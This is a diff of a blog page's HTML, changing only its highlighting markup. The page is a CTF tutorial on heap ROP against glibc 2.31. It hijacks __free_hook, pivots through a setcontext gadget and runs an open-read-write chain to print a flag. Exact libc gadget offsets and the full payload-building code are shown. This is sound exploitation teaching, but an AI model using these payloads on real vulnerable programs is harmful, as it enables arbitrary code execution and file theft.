@@ -131,93 +131,93 @@
 <h2 id="gadgets">Gadgets</h2>
 <p>As I mentioned in the title, this technique is a ROP chain on the heap, and with ROP, the most important things are the gadgets. All the gadgets that are used in this technique are in <code>libc</code> itself, the <code>libc-2.31.so</code> version I used here has <code>md5sum</code> of <code>1ec728d58f7fc0d302119e9bb53050f8</code>. If you have a <code>libc-2.31.so</code> that has different checksum, the offset might be different, but the gadgets should still be there. Below are the gadgets I use:</p>
 <p>Firstly, the ordinary gadgets that deal with manipulating registers and <code>syscall</code>:</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># l.address is leaked base of libc</span>
-<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x26b72</span>
-<span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x27529</span>
-<span class="n">pop_rdx_r12</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x11c371</span>
-<span class="n">push_rax</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x45197</span>
-<span class="n">pop_rax</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4a550</span>
-<span class="n">xchg_eax_edi</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x2ad2b</span>
-<span class="n">syscall_ret</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x66229</span>
-</code></pre></div><p>All the gadgets except <code>syscall_ret</code> can be found using this <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener noreffer">ROPgadget</a> tool. For <code>syscall_ret</code>, you can use this command (thanks <a href="https://blog.efiens.com/author/catafact/" target="_blank" rel="noopener noreffer">@Catafact</a> for this):</p>
-<pre><code>objdump -D -Mintel ./libc-2.31.so | grep -B 1 ret | grep -A 1 syscall
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># l.address is leaked base of libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x26b72</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x27529</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_r12</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x11c371</span>
+</span></span><span class="line"><span class="cl"><span class="n">push_rax</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x45197</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rax</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4a550</span>
+</span></span><span class="line"><span class="cl"><span class="n">xchg_eax_edi</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x2ad2b</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall_ret</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x66229</span>
+</span></span></code></pre></div><p>All the gadgets except <code>syscall_ret</code> can be found using this <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener noreffer">ROPgadget</a> tool. For <code>syscall_ret</code>, you can use this command (thanks <a href="https://blog.efiens.com/author/catafact/" target="_blank" rel="noopener noreffer">@Catafact</a> for this):</p>
+<pre tabindex="0"><code>objdump -D -Mintel ./libc-2.31.so | grep -B 1 ret | grep -A 1 syscall
 </code></pre><p>The next 2 gadgets are crucial for this technique, the first one is at <code>call_gadget = l.address + 0x154930</code>:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">mov     rdx, <span class="o">[</span>rdi+8<span class="o">]</span>
-mov     <span class="o">[</span>rsp<span class="o">]</span>, rax
-call    qword ptr <span class="o">[</span>rdx+0x20<span class="o">]</span>
-</code></pre></div><p>This gadget is what we will overwrite <code>__free_hook</code> with. It allows us to call an arbitrary function through <code>rdx</code>, if we control <code>rdi</code>, which is exactly the parameter that will be passed to <code>free()</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mov     rdx, <span class="o">[</span>rdi+8<span class="o">]</span>
+</span></span><span class="line"><span class="cl">mov     <span class="o">[</span>rsp<span class="o">]</span>, rax
+</span></span><span class="line"><span class="cl">call    qword ptr <span class="o">[</span>rdx+0x20<span class="o">]</span>
+</span></span></code></pre></div><p>This gadget is what we will overwrite <code>__free_hook</code> with. It allows us to call an arbitrary function through <code>rdx</code>, if we control <code>rdi</code>, which is exactly the parameter that will be passed to <code>free()</code>.</p>
 <p>The next gadget is inside libc function <code>setcontext()</code>, at offset <code>setcontext_gadget = l.address + 0x580DD</code>:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">mov     rsp, <span class="o">[</span>rdx+0A0h<span class="o">]</span>
-mov     rbx, <span class="o">[</span>rdx+80h<span class="o">]</span>
-mov     rbp, <span class="o">[</span>rdx+78h<span class="o">]</span>
-mov     r12, <span class="o">[</span>rdx+48h<span class="o">]</span>
-mov     r13, <span class="o">[</span>rdx+50h<span class="o">]</span>
-mov     r14, <span class="o">[</span>rdx+58h<span class="o">]</span>
-mov     r15, <span class="o">[</span>rdx+60h<span class="o">]</span>
-<span class="nb">test</span>    dword ptr fs:48h, <span class="m">2</span>
-jz      loc_581C6
-
-loc_581C6:
-mov     rcx, <span class="o">[</span>rdx+0A8h<span class="o">]</span>
-push    rcx
-mov     rsi, <span class="o">[</span>rdx+70h<span class="o">]</span>
-mov     rdi, <span class="o">[</span>rdx+68h<span class="o">]</span>
-mov     rcx, <span class="o">[</span>rdx+98h<span class="o">]</span>
-mov     r8, <span class="o">[</span>rdx+28h<span class="o">]</span>
-mov     r9, <span class="o">[</span>rdx+30h<span class="o">]</span>
-mov     rdx, <span class="o">[</span>rdx+88h<span class="o">]</span>
-xor     eax, eax
-ret
-</code></pre></div><p>Because we control <code>rdx</code>, this gadget allows us to set almost every registers (with the exception of <code>rax</code>, <code>r10</code> and <code>r11</code>).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mov     rsp, <span class="o">[</span>rdx+0A0h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">mov     rbx, <span class="o">[</span>rdx+80h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">mov     rbp, <span class="o">[</span>rdx+78h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">mov     r12, <span class="o">[</span>rdx+48h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">mov     r13, <span class="o">[</span>rdx+50h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">mov     r14, <span class="o">[</span>rdx+58h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">mov     r15, <span class="o">[</span>rdx+60h<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">test</span>    dword ptr fs:48h, <span class="m">2</span>
+</span></span><span class="line"><span class="cl">jz      loc_581C6
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">loc_581C6:
+</span></span><span class="line"><span class="cl">mov     rcx, <span class="o">[</span>rdx+0A8h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">push    rcx
+</span></span><span class="line"><span class="cl">mov     rsi, <span class="o">[</span>rdx+70h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">mov     rdi, <span class="o">[</span>rdx+68h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">mov     rcx, <span class="o">[</span>rdx+98h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">mov     r8, <span class="o">[</span>rdx+28h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">mov     r9, <span class="o">[</span>rdx+30h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">mov     rdx, <span class="o">[</span>rdx+88h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">xor     eax, eax
+</span></span><span class="line"><span class="cl">ret
+</span></span></code></pre></div><p>Because we control <code>rdx</code>, this gadget allows us to set almost every registers (with the exception of <code>rax</code>, <code>r10</code> and <code>r11</code>).</p>
 <h2 id="the-payload">The payload</h2>
 <p>My payload can be divided into 3 parts, which I will explain one by one.</p>
 <p>The first part:</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">base</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="o">&lt;.....&gt;</span>             <span class="c1"># payload_base (address of the chunk)</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span>                  <span class="c1"># &lt;-- [rdi] &lt;-- payload_base</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>              <span class="c1"># &lt;-- [rdi + 8] = rdx</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mh">0x10</span>              <span class="c1"># padding</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">setcontext_gadget</span><span class="p">)</span> <span class="c1"># &lt;-- [rdx + 0x20]</span>
-</code></pre></div><p>This is the <code>base</code> of our payload, where <code>rdi</code> will be pointed to when <code>free()</code> is called. I set <code>[rdi + 8]</code> to also be <code>base</code>, so that when <code>mov rdx, [rdi+8]</code> is executed, <code>rdx</code> will also point at <code>base</code>. Then <code>[rdx + 0x20]</code> will be the address of the <code>setcontext()</code> gadget, which will be called.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="o">&lt;.....&gt;</span>             <span class="c1"># payload_base (address of the chunk)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span>                  <span class="c1"># &lt;-- [rdi] &lt;-- payload_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>              <span class="c1"># &lt;-- [rdi + 8] = rdx</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mh">0x10</span>              <span class="c1"># padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">setcontext_gadget</span><span class="p">)</span> <span class="c1"># &lt;-- [rdx + 0x20]</span>
+</span></span></code></pre></div><p>This is the <code>base</code> of our payload, where <code>rdi</code> will be pointed to when <code>free()</code> is called. I set <code>[rdi + 8]</code> to also be <code>base</code>, so that when <code>mov rdx, [rdi+8]</code> is executed, <code>rdx</code> will also point at <code>base</code>. Then <code>[rdx + 0x20]</code> will be the address of the <code>setcontext()</code> gadget, which will be called.</p>
 <p>The second part, which will be utilized after <code>setcontext_gadget</code> is called:</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x28] = r8</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x30] = r9</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x10</span>              <span class="c1"># padding</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x48] = r12</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x50] = r13</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x58] = r14</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x60] = r15</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="mh">0x258</span><span class="p">)</span>      <span class="c1"># &lt;-- [rdx + 0x68] = rdi (ptr to flag path)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x70] = rsi (flag = O_RDONLY)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x78] = rbp</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x80] = rbx</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x88] = rdx </span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span>                 <span class="c1"># padding</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x98] = rcx </span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="mh">0x1b0</span><span class="p">)</span>      <span class="c1"># &lt;-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span>           <span class="c1"># &lt;-- [rdx + 0xa8] = rcx, will be pushed to rsp</span>
-</code></pre></div><p>With the comments, it is self-explanatory. This is where all the registers are set based on <code>rdx</code>. Even though there are lots of registers to set, I&rsquo;m only interested at <code>rdi</code> and <code>rsi</code>, which will be the parameters to <code>sys_open</code>, along with <code>rcx</code> and <code>rsp</code>, which must be carefully set so that after <code>push rcx</code> is executed, <code>rsp</code> must be in the correct position to execute the third part, which is the ROP chain on the heap, <code>rcx</code> is set to <code>pop_rax</code> gadget to start the chain.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x28] = r8</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x30] = r9</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x10</span>              <span class="c1"># padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x48] = r12</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x50] = r13</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x58] = r14</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x60] = r15</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="mh">0x258</span><span class="p">)</span>      <span class="c1"># &lt;-- [rdx + 0x68] = rdi (ptr to flag path)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x70] = rsi (flag = O_RDONLY)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x78] = rbp</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x80] = rbx</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x88] = rdx </span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span>                 <span class="c1"># padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                 <span class="c1"># &lt;-- [rdx + 0x98] = rcx </span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="mh">0x1b0</span><span class="p">)</span>      <span class="c1"># &lt;-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span>           <span class="c1"># &lt;-- [rdx + 0xa8] = rcx, will be pushed to rsp</span>
+</span></span></code></pre></div><p>With the comments, it is self-explanatory. This is where all the registers are set based on <code>rdx</code>. Even though there are lots of registers to set, I&rsquo;m only interested at <code>rdi</code> and <code>rsi</code>, which will be the parameters to <code>sys_open</code>, along with <code>rcx</code> and <code>rsp</code>, which must be carefully set so that after <code>push rcx</code> is executed, <code>rsp</code> must be in the correct position to execute the third part, which is the ROP chain on the heap, <code>rcx</code> is set to <code>pop_rax</code> gadget to start the chain.</p>
 <p>The third part:</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> <span class="c1"># sys_open(&#34;/path/to/flag&#34;, O_RDONLY)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">xchg_eax_edi</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x15000</span><span class="p">)</span> <span class="c1"># destination buffer, can be anywhere readable and writable</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># nbytes</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> <span class="c1"># sys_read(eax, heap + 0x15000, 0x100)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x15000</span><span class="p">)</span> <span class="c1"># buffer</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># nbytes</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> <span class="c1"># sys_write(1, heap + 0x15000, 0x100)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/path/to/flag&#34;</span>
-</code></pre></div><p>Nothing much to say about this part, if you know ROP, you know that this is an ordinary <code>open-read-write</code> chain.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> <span class="c1"># sys_open(&#34;/path/to/flag&#34;, O_RDONLY)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">xchg_eax_edi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x15000</span><span class="p">)</span> <span class="c1"># destination buffer, can be anywhere readable and writable</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># nbytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> <span class="c1"># sys_read(eax, heap + 0x15000, 0x100)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x15000</span><span class="p">)</span> <span class="c1"># buffer</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># nbytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> <span class="c1"># sys_write(1, heap + 0x15000, 0x100)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/path/to/flag&#34;</span>
+</span></span></code></pre></div><p>Nothing much to say about this part, if you know ROP, you know that this is an ordinary <code>open-read-write</code> chain.</p>
 <p>After allocating this <code>payload</code> and overwriting <code>__free_hook</code> with the <code>call_gadget</code>, calling <code>free()</code> on it will execute the chain and print out the <code>flag</code>.</p>
 <h2 id="examples">Examples</h2>
 <p>Here are some writeups to challenges that me and my team solved using this technique:</p>
@@ -252,7 +252,7 @@ ret
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.83.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.99.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
         </div>
     </footer></div>
